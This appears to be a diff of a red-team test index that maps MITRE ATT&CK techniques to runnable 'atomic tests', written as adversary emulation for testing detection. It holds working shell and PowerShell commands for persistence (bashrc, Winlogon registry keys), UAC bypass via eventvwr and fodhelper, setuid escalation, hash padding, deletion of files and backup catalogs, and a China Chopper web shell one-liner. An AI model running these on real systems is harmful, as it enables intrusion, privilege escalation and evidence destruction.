@@ -46,23 +46,40 @@ persistence:
       created: '2017-12-14T16:46:06.044Z'
       identifier: T1156
     atomic_tests:
-    - name: ".bash_profile and .bashrc"
-      description: 'xxx
+    - name: Add command to .bash_profile
+      description: 'Adds a command to the .bash_profile file of the current user
 
 '
       supported_platforms:
       - macos
       - linux
       input_arguments:
-        script:
-          description: path to script
-          type: path
+        command_to_add:
+          description: Command to add to the .bash_profile file
+          type: string
           default: "/path/to/script.py"
       executor:
         name: sh
-        command: |
-          echo "#{script}" >> ~/.bash_profile
-          echo "#{script}" >> ~/.bashrc
+        command: 'echo "#{command_to_add}" >> ~/.bash_profile
+
+'
+    - name: Add command to .bashrc
+      description: 'Adds a command to the .bashrc file of the current user
+
+'
+      supported_platforms:
+      - macos
+      - linux
+      input_arguments:
+        command_to_add:
+          description: Command to add to the .bashrc file
+          type: string
+          default: "/path/to/script.py"
+      executor:
+        name: sh
+        command: 'echo "#{command_to_add}" >> ~/.bashrc
+
+'
   T1015:
     technique:
       id: attack-pattern--9b99b83a-1aac-4e29-b975-b374950551a3
@@ -347,63 +364,58 @@ persistence:
               }
   '':
     technique:
-      id: attack-pattern--514ede4c-78b3-4d78-a38b-daddf6217a79
+      id: attack-pattern--c16e5409-ee53-4d79-afdc-4099dc9292df
       created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
-      name: Winlogon Helper DLL
-      description: "Winlogon.exe is a Windows component responsible for actions at
-        logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete.
-        Registry entries in <code>HKLM\\Software\\[Wow6432Node\\]Microsoft\\Windows
-        NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows
-        NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper
-        programs and functionalities that support Winlogon. (Citation: Cylance Reg
-        Persistence Sept 2013) \n\nMalicious modifications to these Registry keys
-        may cause Winlogon to load and execute malicious DLLs and/or executables.
-        Specifically, the following subkeys have been known to be possibly vulnerable
-        to abuse: (Citation: Cylance Reg Persistence Sept 2013)\n\n* Winlogon\\Notify
-        - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit
-        - points to userinit.exe, the user initialization program executed when a
-        user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell
-        executed when a user logs on\n\nAdversaries may take advantage of these features
-        to repeatedly execute malicious code and establish Persistence."
+      name: Web Shell
+      description: |-
+        A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). (Citation: Lee 2013)
+
+        Web shells may serve as [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a persistence mechanism in case an adversary's primary access methods are detected and removed.
       external_references:
-      - external_id: T1004
-        url: https://attack.mitre.org/techniques/T1004
+      - external_id: T1100
+        url: https://attack.mitre.org/techniques/T1100
         source_name: mitre-attack
-      - external_id: CAPEC-579
-        url: https://capec.mitre.org/data/definitions/579.html
-        source_name: capec
-      - url: https://technet.microsoft.com/en-us/sysinternals/bb963902
-        description: Russinovich, M. (2016, January 4). Autoruns for Windows v13.51.
-          Retrieved June 6, 2016.
-        source_name: TechNet Autoruns
-      - url: https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order
-        description: 'Langendorf, S. (2013, September 24). Windows Registry Persistence,
-          Part 2: The Run Keys and Search-Order. Retrieved April 11, 2018.'
-        source_name: Cylance Reg Persistence Sept 2013
+      - url: https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html
+        description: Lee, T., Hanzlik, D., Ahl, I. (2013, August 7). Breaking Down
+          the China Chopper Web Shell - Part I. Retrieved March 27, 2015.
+        source_name: Lee 2013
+      - url: https://www.us-cert.gov/ncas/alerts/TA15-314A
+        description: US-CERT. (2015, November 13). Compromised Web Servers and Web
+          Shells - Threat Awareness and Guidance. Retrieved June 8, 2016.
+        source_name: US-CERT Alert TA15-314A Web Shells
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       x_mitre_version: '1.0'
-      x_mitre_contributors:
-      - Praetorian
       x_mitre_data_sources:
-      - Windows Registry
+      - Anti-virus
+      - Authentication logs
       - File monitoring
+      - Netflow/Enclave netflow
       - Process monitoring
       x_mitre_detection: |-
-        Monitor for changes to Registry entries associated with Winlogon that do not correlate with known software, patch cycles, etc. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current Winlogon helper values. (Citation: TechNet Autoruns)  New DLLs written to System32 that do not correlate with known good software or patching may also be suspicious.
+        Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: (Citation: Lee 2013)
 
-        Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.
-      x_mitre_permissions_required:
-      - Administrator
+        <code><?php @eval($_POST['password']);></code>
+
+        Nevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as running [cmd](https://attack.mitre.org/software/S0106) or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells)
+      x_mitre_effective_permissions:
       - SYSTEM
+      - User
       x_mitre_platforms:
+      - Linux
       - Windows
+      - macOS
+      x_mitre_system_requirements:
+      - Adversary access to Web server with vulnerability or account to upload and
+        serve the Web shell file.
       type: attack-pattern
       kill_chain_phases:
       - phase_name: persistence
         kill_chain_name: mitre-attack
+      - phase_name: privilege-escalation
+        kill_chain_name: mitre-attack
       modified: '2018-10-17T00:14:20.652Z'
-      created: '2017-05-31T21:30:20.148Z'
+      created: '2017-05-31T21:31:13.061Z'
     atomic_tests: []
   T1103:
     technique:
@@ -3302,6 +3314,44 @@ persistence:
           3. sudo chmod u+s hello
 
           4. ./hello
+    - name: Set a SetUID flag on file
+      description: 'This test sets the SetUID flag on a file in Linux and macOS.
+
+'
+      supported_platforms:
+      - macos
+      - centos
+      - ubuntu
+      - linux
+      input_arguments:
+        file_to_setuid:
+          description: Path of file to set SetUID flag
+          type: path
+          default: "/tmp/evilBinary"
+      executor:
+        name: sh
+        command: |
+          sudo chown root #{file_to_setuid}
+          sudo chmod u+s #{file_to_setuid}
+    - name: Set a SetGID flag on file
+      description: 'This test sets the SetGID flag on a file in Linux and macOS.
+
+'
+      supported_platforms:
+      - macos
+      - centos
+      - ubuntu
+      - linux
+      input_arguments:
+        file_to_setuid:
+          description: Path of file to set SetGID flag
+          type: path
+          default: "/tmp/evilBinary"
+      executor:
+        name: sh
+        command: |
+          sudo chown root #{file_to_setuid}
+          sudo chmod g+s #{file_to_setuid}
   T1165:
     technique:
       id: attack-pattern--2ba5aa71-9d15-4b22-b726-56af06d9ad2f
@@ -3565,6 +3615,120 @@ persistence:
           $FilterConsumerBindingToCleanup | Remove-WmiObject
           $EventConsumerToCleanup | Remove-WmiObject
           $EventFilterToCleanup | Remove-WmiObject
+  T1004:
+    technique:
+      id: attack-pattern--514ede4c-78b3-4d78-a38b-daddf6217a79
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      name: Winlogon Helper DLL
+      description: "Winlogon.exe is a Windows component responsible for actions at
+        logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete.
+        Registry entries in <code>HKLM\\Software\\[Wow6432Node\\]Microsoft\\Windows
+        NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows
+        NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper
+        programs and functionalities that support Winlogon. (Citation: Cylance Reg
+        Persistence Sept 2013) \n\nMalicious modifications to these Registry keys
+        may cause Winlogon to load and execute malicious DLLs and/or executables.
+        Specifically, the following subkeys have been known to be possibly vulnerable
+        to abuse: (Citation: Cylance Reg Persistence Sept 2013)\n\n* Winlogon\\Notify
+        - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit
+        - points to userinit.exe, the user initialization program executed when a
+        user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell
+        executed when a user logs on\n\nAdversaries may take advantage of these features
+        to repeatedly execute malicious code and establish Persistence."
+      external_references:
+      - external_id: T1004
+        url: https://attack.mitre.org/techniques/T1004
+        source_name: mitre-attack
+      - external_id: CAPEC-579
+        url: https://capec.mitre.org/data/definitions/579.html
+        source_name: capec
+      - url: https://technet.microsoft.com/en-us/sysinternals/bb963902
+        description: Russinovich, M. (2016, January 4). Autoruns for Windows v13.51.
+          Retrieved June 6, 2016.
+        source_name: TechNet Autoruns
+      - url: https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order
+        description: 'Langendorf, S. (2013, September 24). Windows Registry Persistence,
+          Part 2: The Run Keys and Search-Order. Retrieved April 11, 2018.'
+        source_name: Cylance Reg Persistence Sept 2013
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      x_mitre_contributors:
+      - Praetorian
+      x_mitre_data_sources:
+      - Windows Registry
+      - File monitoring
+      - Process monitoring
+      x_mitre_detection: |-
+        Monitor for changes to Registry entries associated with Winlogon that do not correlate with known software, patch cycles, etc. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current Winlogon helper values. (Citation: TechNet Autoruns)  New DLLs written to System32 that do not correlate with known good software or patching may also be suspicious.
+
+        Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.
+      x_mitre_permissions_required:
+      - Administrator
+      - SYSTEM
+      x_mitre_platforms:
+      - Windows
+      type: attack-pattern
+      kill_chain_phases:
+      - phase_name: persistence
+        kill_chain_name: mitre-attack
+      modified: '2018-10-17T00:14:20.652Z'
+      created: '2017-05-31T21:30:20.148Z'
+      identifier: T1004
+    atomic_tests:
+    - name: Winlogon Shell Key Persistence - PowerShell
+      description: 'PowerShell code to set Winlogon shell key to execute a binary
+        at logon along with explorer.exe.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        binary_to_execute:
+          description: Path of binary to execute
+          type: Path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: powershell
+        command: 'Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"
+          "Shell" "explorer.exe, #{binary_to_execute}" -Force
+
+'
+    - name: Winlogon Userinit Key Persistence - PowerShell
+      description: 'PowerShell code to set Winlogon userinit key to execute a binary
+        at logon along with userinit.exe.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        binary_to_execute:
+          description: Path of binary to execute
+          type: Path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: powershell
+        command: 'Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"
+          "Userinit" "Userinit.exe, #{binary_to_execute}" -Force
+
+'
+    - name: Winlogon Notify Key Logon Persistence - PowerShell
+      description: 'PowerShell code to set Winlogon Notify key to execute a notification
+        package DLL at logon.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        binary_to_execute:
+          description: Path of notification package to execute
+          type: Path
+          default: C:\Windows\Temp\atomicNotificationPackage.dll
+      executor:
+        name: powershell
+        command: |
+          New-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" -Force
+          Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" "logon" "#{binary_to_execute}" -Force
 defense-evasion:
   T1134:
     technique:
@@ -3914,22 +4078,24 @@ defense-evasion:
       created: '2017-05-31T21:30:22.096Z'
       identifier: T1009
     atomic_tests:
-    - name: Pad Evil Binary to Change Hash
-      description: 'Copies cat to create an "evil binary" and pads it with a zero
-        to change the hash without harming execution
+    - name: Pad Binary to Change Hash - Linux/macOS dd
+      description: 'Uses dd to add a zero to the binary to change the hash
 
 '
       supported_platforms:
       - macos
       - linux
+      input_arguments:
+        binary_to_pad:
+          description: Path of binary to be padded
+          type: Path
+          default: "/tmp/EvilBinary"
       executor:
         name: sh
         command: |
-          cp /bin/cat /tmp/evilCat
-          md5sum /tmp/evilCat
-          dd if=/dev/zero bs=1 count=1 >> /tmp/evilCat
-          md5sum /tmp/evilCat
-          /tmp/evilCat .bash_profile
+          md5sum #{binary_to_pad}
+          dd if=/dev/zero bs=1 count=1 >> #{binary_to_pad}
+          md5sum #{binary_to_pad}
   T1088:
     technique:
       id: attack-pattern--ca1a3f50-5ebd-41f8-8320-2c7d6a6e88be
@@ -4043,7 +4209,62 @@ defense-evasion:
         name: command_prompt
         command: |
           reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f
-          cmd.exe -c eventvwr.msc
+          cmd.exe /c eventvwr.msc
+    - name: Bypass UAC using Event Viewer - PowerShell
+      description: 'PowerShell code to bypass User Account Control using Event Viewer
+        and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        executable_binary:
+          description: Binary to execute with UAC Bypass
+          type: path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: command_prompt
+        command: |
+          New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
+          Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
+          Start-Process "C:\Windows\System32\eventvwr.msc"
+    - name: Bypass UAC using Fodhelper
+      description: 'Bypasses User Account Control using the Windows 10 Features on
+        Demand Helper (fodhelper.exe). Requires Windows 10.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        executable_binary:
+          description: Binary to execute with UAC Bypass
+          type: path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: command_prompt
+        command: |
+          reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
+          reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
+          fodhelper.exe
+    - name: Bypass UAC using Fodhelper - PowerShell
+      description: 'PowerShell code to bypass User Account Control using the Windows
+        10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        executable_binary:
+          description: Binary to execute with UAC Bypass
+          type: path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: powershell
+        command: |
+          New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
+          New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
+          Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
+          Start-Process "C:\Windows\System32\fodhelper.exe"
   T1191:
     technique:
       id: attack-pattern--7d6f590f-544b-45b4-9a42-e0805f342af3
@@ -4926,41 +5147,39 @@ defense-evasion:
       created: '2017-05-31T21:31:17.915Z'
       identifier: T1107
     atomic_tests:
-    - name: Victim configuration
-      description: 'Create a temporary directory and several files on the victim system
-        for later deletion
-
-'
-      supported_platforms:
-      - linux
-      executor:
-        name: sh
-        command: |
-          mkdir /tmp/victim-files
-          cd /tmp/victim-files
-          touch a b c d e f g
-          echo "This file will be shredded" > /tmp/victim-shred.txt
-    - name: Delete a single file
+    - name: Delete a single file - Linux/macOS
       description: 'Delete a single file from the temporary directory
 
 '
       supported_platforms:
       - linux
+      - macos
+      input_arguments:
+        file_to_delete:
+          description: Path of file to delete
+          type: Path
+          default: "/tmp/victim-files/a"
       executor:
         name: sh
-        command: 'rm -f /tmp/victim-files/a
+        command: 'rm -f #{file_to_delete}
 
 '
-    - name: Delete an entire folder
+    - name: Delete an entire folder - Linux/macOS
       description: 'Recursively delete the temporary directory and all files contained
         within it
 
 '
       supported_platforms:
       - linux
+      - macos
+      input_arguments:
+        folder_to_delete:
+          description: Path of folder to delete
+          type: Path
+          default: "/tmp/victim-files"
       executor:
         name: sh
-        command: 'rm -rf /tmp/victim-files
+        command: 'rm -rf #{folder_to_delete}
 
 '
     - name: Overwrite and delete a file with shred
@@ -4970,83 +5189,80 @@ defense-evasion:
 '
       supported_platforms:
       - linux
+      input_arguments:
+        file_to_shred:
+          description: Path of file to shred
+          type: Path
+          default: "/tmp/victim-shred.txt"
       executor:
         name: sh
-        command: 'shred -u /tmp/victim-shred.txt
+        command: 'shred -u #{file_to_shred}
 
 '
-    - name: Victim configuration
-      description: 'Create a temporary directory and several files on the victim system
-        for later deletion
-
-'
-      supported_platforms:
-      - windows
-      executor:
-        name: command_prompt
-        command: |
-          mkdir %TEMP%\victim-files-cmd
-          cd %TEMP%\victim-files-cmd
-          type nul > a
-          type nul > b
-          type nul > c
-          type nul > d
-          type nul > e
-          type nul > f
-          type nul > g
-          mkdir %TEMP%\victim-files-ps
-          cd %TEMP%\victim-files-ps
-          type nul > a
-          type nul > b
-          type nul > c
-          type nul > d
-          type nul > e
-          type nul > f
-          type nul > g
-    - name: Delete a single file - cmd
+    - name: Delete a single file - Windows cmd
       description: 'Delete a single file from the temporary directory using cmd.exe
 
 '
       supported_platforms:
       - windows
+      input_arguments:
+        file_to_delete:
+          description: Path of file to delete
+          type: Path
+          default: C:\Windows\Temp\victim-files-cmd\a
       executor:
         name: command_prompt
-        command: 'del /f %TEMP%\victim-files-cmd\a
+        command: 'del /f #{file_to_delete}
 
 '
-    - name: Delete an entire folder - cmd
+    - name: Delete an entire folder - Windows cmd
       description: 'Recursively delete the temporary directory and all files contained
         within it using cmd.exe
 
 '
       supported_platforms:
       - windows
+      input_arguments:
+        folder_to_delete:
+          description: Path of folder to delete
+          type: Path
+          default: C:\Windows\Temp\victim-files-cmd
       executor:
         name: command_prompt
-        command: 'del /f /S %TEMP%\victim-files-cmd
+        command: 'del /f /S #{folder_to_delete}
 
 '
-    - name: Delete a single file - ps
+    - name: Delete a single file - Windows PowerShell
       description: 'Delete a single file from the temporary directory using Powershell
 
 '
       supported_platforms:
       - windows
+      input_arguments:
+        file_to_delete:
+          description: Path of file to delete
+          type: Path
+          default: C:\Windows\Temp\victim-files-ps\a
       executor:
         name: powershell
-        command: 'Remove-Item -path %TEMP%\victim-files-ps\a
+        command: 'Remove-Item -path "#{file_to_delete}"
 
 '
-    - name: Delete an entire folder - ps
+    - name: Delete an entire folder - Windows PowerShell
       description: 'Recursively delete the temporary directory and all files contained
         within it using Powershell
 
 '
       supported_platforms:
       - windows
+      input_arguments:
+        folder_to_delete:
+          description: Path of folder to delete
+          type: Path
+          default: C:\Windows\Temp\victim-files-ps
       executor:
         name: powershell
-        command: 'Remove-Item -path %TEMP%\victim-files-ps -recurse
+        command: 'Remove-Item -path "#{folder_to_delete}" -recurse
 
 '
     - name: Delete VSS - vssadmin
@@ -5090,7 +5306,7 @@ defense-evasion:
       - windows
       executor:
         name: command_prompt
-        command: 'wbdadmin delete catalog -quiet
+        command: 'wbadmin delete catalog -quiet
 
 '
   T1222:
@@ -8127,6 +8343,22 @@ defense-evasion:
         command: 'SyncAppvPublishingServer.exe "n; #{powershell_code}"
 
 '
+    - name: Register-CimProvider - Execute evil dll
+      description: 'Execute arbitrary dll. Requires at least Windows 8/2012. Also
+        note this dll can be served up via SMB
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        dll_payload:
+          description: DLL to execute
+          type: Path
+          default: C:\AtomicRedTeam\atomics\T1218\src\Win32\T1218-2.dll
+      executor:
+        name: command_prompt
+        command: "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path #{dll_payload}
+          \n"
   T1216:
     technique:
       id: attack-pattern--f6fe9070-7a65-49ea-ae72-76292f42cebe
@@ -9360,7 +9592,62 @@ privilege-escalation:
         name: command_prompt
         command: |
           reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f
-          cmd.exe -c eventvwr.msc
+          cmd.exe /c eventvwr.msc
+    - name: Bypass UAC using Event Viewer - PowerShell
+      description: 'PowerShell code to bypass User Account Control using Event Viewer
+        and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        executable_binary:
+          description: Binary to execute with UAC Bypass
+          type: path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: command_prompt
+        command: |
+          New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
+          Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
+          Start-Process "C:\Windows\System32\eventvwr.msc"
+    - name: Bypass UAC using Fodhelper
+      description: 'Bypasses User Account Control using the Windows 10 Features on
+        Demand Helper (fodhelper.exe). Requires Windows 10.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        executable_binary:
+          description: Binary to execute with UAC Bypass
+          type: path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: command_prompt
+        command: |
+          reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
+          reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
+          fodhelper.exe
+    - name: Bypass UAC using Fodhelper - PowerShell
+      description: 'PowerShell code to bypass User Account Control using the Windows
+        10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        executable_binary:
+          description: Binary to execute with UAC Bypass
+          type: path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: powershell
+        command: |
+          New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
+          New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
+          Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
+          Start-Process "C:\Windows\System32\fodhelper.exe"
   T1179:
     technique:
       id: attack-pattern--66f73398-8394-4711-85e5-34c8540b22a5
@@ -10319,6 +10606,44 @@ privilege-escalation:
           3. sudo chmod u+s hello
 
           4. ./hello
+    - name: Set a SetUID flag on file
+      description: 'This test sets the SetUID flag on a file in Linux and macOS.
+
+'
+      supported_platforms:
+      - macos
+      - centos
+      - ubuntu
+      - linux
+      input_arguments:
+        file_to_setuid:
+          description: Path of file to set SetUID flag
+          type: path
+          default: "/tmp/evilBinary"
+      executor:
+        name: sh
+        command: |
+          sudo chown root #{file_to_setuid}
+          sudo chmod u+s #{file_to_setuid}
+    - name: Set a SetGID flag on file
+      description: 'This test sets the SetGID flag on a file in Linux and macOS.
+
+'
+      supported_platforms:
+      - macos
+      - centos
+      - ubuntu
+      - linux
+      input_arguments:
+        file_to_setuid:
+          description: Path of file to set SetGID flag
+          type: path
+          default: "/tmp/evilBinary"
+      executor:
+        name: sh
+        command: |
+          sudo chown root #{file_to_setuid}
+          sudo chmod g+s #{file_to_setuid}
   T1165:
     technique:
       id: attack-pattern--2ba5aa71-9d15-4b22-b726-56af06d9ad2f
@@ -10768,18 +11093,18 @@ discovery:
         command: 'query user
 
 '
-  '':
+  T1010:
     technique:
-      id: attack-pattern--348f1eef-964b-4eb6-bb53-69b3dcb0c643
+      id: attack-pattern--4ae4f953-fe58-4cc8-a327-33257e30a830
       created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
-      name: Peripheral Device Discovery
-      description: Adversaries may attempt to gather information about attached peripheral
-        devices and components connected to a computer system. The information may
-        be used to enhance their awareness of the system and network environment or
-        may be used for further actions.
+      name: Application Window Discovery
+      description: |-
+        Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.
+
+        In Mac, this can be done natively with a small [AppleScript](https://attack.mitre.org/techniques/T1155) script.
       external_references:
-      - external_id: T1120
-        url: https://attack.mitre.org/techniques/T1120
+      - external_id: T1010
+        url: https://attack.mitre.org/techniques/T1010
         source_name: mitre-attack
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
@@ -10788,19 +11113,44 @@ discovery:
         System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.
 
         Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086).
+      x_mitre_data_sources:
+      - API monitoring
+      - Process monitoring
+      - Process command-line parameters
+      x_mitre_platforms:
+      - macOS
+      - Windows
       x_mitre_permissions_required:
       - User
-      - Administrator
-      - SYSTEM
-      x_mitre_platforms:
-      - Windows
       type: attack-pattern
       kill_chain_phases:
       - phase_name: discovery
         kill_chain_name: mitre-attack
       modified: '2018-10-17T00:14:20.652Z'
-      created: '2017-05-31T21:31:28.471Z'
-    atomic_tests: []
+      created: '2017-05-31T21:30:24.512Z'
+      identifier: T1010
+    atomic_tests:
+    - name: List Process Main Windows - C# .NET
+      description: 'Compiles and executes C# code to list main window titles associated
+        with each process.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        input_source_code:
+          description: Path to source of C# code
+          type: path
+          default: C:\AtomicRedTeam\atomics\T1010\src\T1010.cs
+        output_file_name:
+          description: Name of output binary
+          type: string
+          default: T1010.exe
+      executor:
+        name: command_prompt
+        command: |
+          C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:#{output_file_name} #{input_source_code}
+          #{output_file_name}
   T1217:
     technique:
       id: attack-pattern--5e4a2073-9643-44cb-a0b5-e7f4048446c7
@@ -11399,6 +11749,39 @@ discovery:
         command: 'cat /etc/login.defs
 
 '
+  '':
+    technique:
+      id: attack-pattern--348f1eef-964b-4eb6-bb53-69b3dcb0c643
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      name: Peripheral Device Discovery
+      description: Adversaries may attempt to gather information about attached peripheral
+        devices and components connected to a computer system. The information may
+        be used to enhance their awareness of the system and network environment or
+        may be used for further actions.
+      external_references:
+      - external_id: T1120
+        url: https://attack.mitre.org/techniques/T1120
+        source_name: mitre-attack
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      x_mitre_detection: |-
+        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.
+
+        Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086).
+      x_mitre_permissions_required:
+      - User
+      - Administrator
+      - SYSTEM
+      x_mitre_platforms:
+      - Windows
+      type: attack-pattern
+      kill_chain_phases:
+      - phase_name: discovery
+        kill_chain_name: mitre-attack
+      modified: '2018-10-17T00:14:20.652Z'
+      created: '2017-05-31T21:31:28.471Z'
+    atomic_tests: []
   T1069:
     technique:
       id: attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce
@@ -12214,6 +12597,23 @@ discovery:
           sc start #{service_name}
           sc stop #{service_name}
           wmic service where (displayname like "#{service_name}") get name
+    - name: System Service Discovery - net.exe
+      description: 'Enumerates started system services using net.exe and writes them
+        to a file. This technique has been used by multiple threat actors.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        output_file:
+          description: Path of file to hold net.exe output
+          type: Path
+          default: C:\Windows\Temp\service-list.txt
+      executor:
+        name: command_prompt
+        command: 'net.exe start >> #{output_file}
+
+'
   T1124:
     technique:
       id: attack-pattern--f3c544dc-673c-4ef3-accb-53229f1ae077
@@ -13607,6 +14007,78 @@ credential-access:
         command: |
           c:\Program Files\Wireshark\tshark.exe -i #{interface} -c 5
           c:\windump.exe
+  T1174:
+    technique:
+      id: attack-pattern--b8c5c9dd-a662-479d-9428-ae745872537c
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      name: Password Filter DLL
+      description: |-
+        Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as dynamic link libraries (DLLs) containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts.
+
+        Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation.
+
+        Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made. (Citation: Carnal Ownage Password Filters Sept 2013)
+      external_references:
+      - external_id: T1174
+        url: https://attack.mitre.org/techniques/T1174
+        source_name: mitre-attack
+      - url: http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html
+        description: Fuller, R. (2013, September 11). Stealing passwords every time
+          they change. Retrieved November 21, 2017.
+        source_name: Carnal Ownage Password Filters Sept 2013
